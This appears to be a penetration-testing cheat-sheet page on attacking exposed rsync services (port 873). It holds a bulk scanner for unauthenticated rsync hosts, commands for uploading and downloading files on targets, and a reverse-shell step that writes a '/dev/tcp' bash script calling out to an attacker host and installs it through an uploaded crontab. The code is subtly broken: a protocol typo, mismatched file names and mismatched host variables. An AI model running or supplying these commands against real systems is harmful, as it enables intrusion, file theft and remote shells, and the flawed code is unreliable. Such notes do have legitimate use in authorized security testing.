# 873 - Rsync

## Potential Risks

### Unauthorized Access

```bash
# RHOST=remoteHost; RPORT=873
rsync rsyns://$RHOST:$RPORT

# Bulk testing
# RHOST_LIST=hosts.txt
run() {
    while IFS= read -r LINE
    do
        if [[ "$LINE" == *":"* ]]; then
            RHOST=${LINE%%:*}
            RPORT=${LINE#*:}
        else
            RHOST=$LINE
            RPORT=873
        fi
        if [[ -n "$(sshpass -p '' rsync rsync://$RHOST:$RPORT 2>/dev/null)" ]]; then
            echo "[SUCCESS] rsync://$RHOST:$RPORT"
        fi
    done < "$RHOST_LIST"
}
run | awk -F '//' '{print $2}'
```

## Exploitation

### Upload File

#### Method 1: Regular upload files

```bash
# RHOST=remoteHost; RPORT=873
rsync -av /path/to/localFile rsync://$RHOST:$RPORT/path/to/remoteFile
```

#### Method 2: Upload crontab to reverse shell

```bash
# RHOST=remoteHost; RPORT=873
# EHOST=evilHost; EPORT=6789

# Method 1: Modify the `crontab` of the remote server
# Step 1: Download the `crontab` of the remote server
# Step 2: Added reverse shell task
# Step 3: Upload the evil 'crontab'

# Method 2: Added the `crontab` of the remote server
# Step 1: Create evil `crontab`
# Step 2: Upload the evil 'crontab'
```

For more information, please refer to page [OOB > Reverse Shell](../../others-high/oob-payload.md#reverse-shell).

#### Method 3: Upload the executable reverse shell file and add crontab to execute

```bash
# RHOST=remoteHost; RPORT=873
# EHOST=evilHost; EPORT=6789

# Step 1: Create a reverse shell script and add executable permissions
echo "#\!/bin/bash\n/bin/bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1" > /tmp/santa_revs.sh
chmod +x /tmp/santaclaus_revs.sh
# Step 2: Upload reverse shell script
rsync -av /tmp/santaclaus_revs.sh rsync://$RHOST:$RPORT/src/tmp/santaclaus_revs.sh
# Step 3: Download and modify the target server crontab
# Step 4: Upload evil crontab
```

For more information, please refer to page [OOB > Reverse Shell](../../others-high/oob-payload.md#reverse-shell).

### Download File

```bash
# RHOST=remoteHost; RPORT=873
rsync -av rsync://$RHOST:$RPORT/path/to/remoteFile /path/to/localFile
```
